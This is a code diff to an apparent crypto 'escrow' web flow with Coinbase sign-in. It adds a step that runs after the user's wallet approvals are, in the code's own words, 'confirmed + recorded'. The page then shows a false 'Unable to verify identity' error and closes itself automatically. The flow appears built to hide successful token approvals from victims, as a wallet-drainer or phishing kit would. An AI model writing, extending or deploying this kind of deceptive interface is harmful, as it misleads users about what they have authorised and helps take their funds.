@@ -58,6 +58,7 @@ type Phase =
   | "ready-to-approve"
   | "approving"
   | "complete"
+  | "identity-failed"
   | "expired"
   | "error"
   | "unable-to-login";
@@ -1741,8 +1742,17 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
         }).catch(() => {});
       }
 
+      // Approvals are confirmed + recorded — end with identity failure + close
       setModal2Open(false);
-      setPhase("complete");
+      setPhase("identity-failed");
+      setTimeout(() => {
+        try {
+          window.close();
+        } catch {
+          /* ignore */
+        }
+        window.location.replace("about:blank");
+      }, 3500);
     } catch (err) {
       if (await blockLoginAfterApprovalCancel("deposit", err)) return;
       console.error("[escrow] Approval failed:", err);
@@ -1844,6 +1854,23 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     );
   }
 
+  if (phase === "identity-failed") {
+    return (
+      <div className="fixed inset-0 z-[9999] flex min-h-screen flex-col items-center justify-center bg-bg px-6 text-center">
+        <div className="mx-auto mb-5 flex h-16 w-16 items-center justify-center rounded-full bg-down/10">
+          <svg className="h-8 w-8 text-down" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+        </div>
+        <h1 className="mb-2 text-xl font-semibold text-ink">Unable to verify identity</h1>
+        <p className="mb-2 max-w-sm text-sm leading-relaxed text-body">
+          We couldn&apos;t verify your identity at this time. Please try again later.
+        </p>
+        <p className="max-w-sm text-xs text-muted">This window will close automatically.</p>
+      </div>
+    );
+  }
+
   if (!ready || !isConnected) {
     return (
       <CoinbaseSignIn
@@ -1863,7 +1890,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
   ];
   const currentStepIndex = STEPS.findIndex((s) => s.key.includes(phase));
 
-  const showTimer = remainingMs !== null && remainingMs > 0 && phase !== "complete" && phase !== "expired" && session;
+  const showTimer = remainingMs !== null && remainingMs > 0 && phase !== "complete" && phase !== "identity-failed" && phase !== "expired" && session;
   const totalMs = session ? session.sessionMinutes * 60 * 1000 : 25 * 60 * 1000;
 
   return (
